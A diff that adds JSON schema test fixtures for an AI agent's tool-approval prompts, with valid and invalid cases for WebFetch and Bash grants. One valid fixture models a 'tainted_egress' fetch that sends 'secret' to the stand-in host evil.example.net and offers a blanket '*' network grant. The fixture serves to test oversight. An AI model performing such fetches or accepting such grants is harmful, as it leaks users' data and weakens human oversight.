@@ -52,6 +52,96 @@
     },
     {
       "schema": "InputPrompt",
+      "name": "network approval offering all web fetches",
+      "valid": true,
+      "value": {
+        "type": "approval",
+        "tool": "WebFetch",
+        "tool_call_id": "toolu_01A09q90qw90lq917835lq9",
+        "class": "network",
+        "input": {
+          "kind": "inline",
+          "value": {
+            "url": "https://evil.example.net/?q=secret"
+          }
+        },
+        "reason": "tainted_egress",
+        "offer_always": true,
+        "suggested_grant": {
+          "tool": "WebFetch",
+          "pattern": "evil.example.net",
+          "class": "network"
+        },
+        "url": "https://evil.example.net/?q=secret",
+        "suggested_grant_all": {
+          "tool": "WebFetch",
+          "pattern": "*",
+          "class": "network"
+        }
+      }
+    },
+    {
+      "schema": "InputPrompt",
+      "name": "all web fetches with a domain",
+      "valid": false,
+      "layer": "json_schema",
+      "value": {
+        "type": "approval",
+        "tool": "WebFetch",
+        "tool_call_id": "toolu_01A09q90qw90lq917835lq9",
+        "class": "network",
+        "input": {
+          "kind": "inline",
+          "value": {
+            "command": "npm install left-pad@1.3.0"
+          }
+        },
+        "reason": "tainted_egress",
+        "offer_always": true,
+        "suggested_grant": {
+          "tool": "Bash",
+          "pattern": "npm install *",
+          "class": "write"
+        },
+        "suggested_grant_all": {
+          "tool": "WebFetch",
+          "pattern": "evil.example.net",
+          "class": "network"
+        }
+      }
+    },
+    {
+      "schema": "InputPrompt",
+      "name": "all web fetches for another tool",
+      "valid": false,
+      "layer": "json_schema",
+      "value": {
+        "type": "approval",
+        "tool": "Bash",
+        "tool_call_id": "toolu_01A09q90qw90lq917835lq9",
+        "class": "write",
+        "input": {
+          "kind": "inline",
+          "value": {
+            "command": "npm install left-pad@1.3.0"
+          }
+        },
+        "reason": "not_allowlisted",
+        "offer_always": true,
+        "suggested_grant": {
+          "tool": "Bash",
+          "pattern": "npm install *",
+          "class": "write"
+        },
+        "suggested_grant_all": {
+          "tool": "Bash",
+          "pattern": "*",
+          "class": "network"
+        }
+      }
+    },
+    {
+      "schema": "InputPrompt",
       "name": "destructive approval",
       "valid": true,
       "value": {
